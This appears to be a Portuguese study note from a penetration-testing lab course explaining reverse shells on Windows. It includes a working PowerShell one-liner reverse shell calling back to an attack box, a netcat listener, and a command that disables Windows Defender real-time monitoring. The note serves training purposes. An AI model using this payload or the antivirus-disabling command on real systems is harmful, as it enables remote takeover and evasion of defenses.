Com um `reverse shell`, a caixa de ataque terá um ouvinte em execução, e o alvo precisará iniciar a conexão.

#### Exemplo de shell reverso
![[Pasted image 20240828100511.png]]

Este texto explica que o uso de *reverse shells* é uma técnica comum em testes de penetração porque as conexões de saída são menos propensas a serem bloqueadas por firewalls, aumentando as chances de passar despercebido. Ao contrário do *bind shell*, que depende de conexões de entrada, o *reverse shell* faz com que a máquina alvo inicie a conexão com a máquina do atacante, invertendo os papéis de servidor e cliente.

Ferramentas como a *Reverse Shell Cheat Sheet* fornecem comandos e códigos pré-criados que podem ser utilizados para criar esses *shells*, mas é importante estar ciente de que administradores de sistemas também conhecem esses recursos, o que pode exigir a personalização dos ataques. A prática é essencial para entender e aplicar esses conceitos em situações reais.

## Prática com um shell reverso simples no Windows

Com este passo a passo, estabeleceremos um shell reverso simples usando algum código PowerShell em um alvo Windows. Vamos iniciar o alvo e começar.

Podemos iniciar um ouvinte Netcat em nossa caixa de ataque quando o alvo aparecer.

#### Servidor ( `attack box`)
```shell-session
NycolasES6@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

Desta vez, com nosso ouvinte, estamos vinculando-o a uma [porta comum](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) ( `443`), essa porta geralmente é para `HTTPS`conexões. Podemos querer usar portas comuns como essa porque, quando iniciamos a conexão com nosso ouvinte, queremos garantir que ela não seja bloqueada na saída pelo firewall do sistema operacional e no nível da rede.

Um firewall capaz de inspeção profunda de pacotes e visibilidade da Camada 7 pode ser capaz de detectar e interromper um shell reverso saindo em uma porta comum porque está examinando o conteúdo dos pacotes de rede, não apenas o endereço IP e a porta.

Depois que o destino do Windows for gerado, vamos nos conectar usando RDP. O Netcat não é nativo dos sistemas Windows, então pode ser pouco confiável contar com ele como nossa ferramenta no lado do Windows.

Dito isso, é ideal usar quaisquer ferramentas que sejam nativas (vivendo da terra) para o alvo ao qual estamos tentando obter acesso.

`What applications and shell languages are hosted on the target?`

Esta é uma excelente pergunta a ser feita sempre que estivermos tentando estabelecer um shell reverso. Vamos usar o prompt de comando e o PowerShell para estabelecer este shell reverso simples. Podemos usar um shell reverso padrão do PowerShell em uma linha para ilustrar este ponto.

No destino do Windows, abra um prompt de comando e copie e cole este comando:

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Considere o que precisamos mudar para que isso nos permita estabelecer um shell reverso com nossa caixa de ataque. Este código do PowerShell também pode ser chamado de ``shell code`` ou nosso ``payload``. Entregar esta carga útil no sistema Windows foi bem direto, considerando que temos controle total do alvo para fins de demonstração. Conforme este módulo avança, notamos que a dificuldade aumenta em como entregamos a carga útil aos alvos.

`What happened when we hit enter in command prompt?`

#### Cliente (alvo)
```cmd-session
At line:1 char:1
+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

O software `Windows Defender antivirus`( `AV`) interrompeu a execução do código. Isso está funcionando exatamente como pretendido e, de uma `defensive`perspectiva, isso é um `win`. De um ponto de vista ofensivo, há alguns obstáculos a serem superados se o AV estiver habilitado em um sistema com o qual estamos tentando nos conectar.

Para nossos propósitos, desejaremos desabilitar o antivírus por meio do `Virus & threat protection settings`ou usando este comando em um console administrativo do PowerShell (clique com o botão direito, execute como administrador):

#### Desativar AV
```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Servidor (caixa de ataque)
```shell-session
NycolasES6@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674

PS C:\Users\htb-student> whoami
ws01\htb-student
```

De volta à nossa caixa de ataque, devemos notar que estabelecemos com sucesso um shell reverso. Podemos ver isso pela mudança no prompt que começa com `PS`e nossa capacidade de interagir com o SO e o sistema de arquivos. Tente executar alguns comandos padrão do Windows para praticar um pouco.









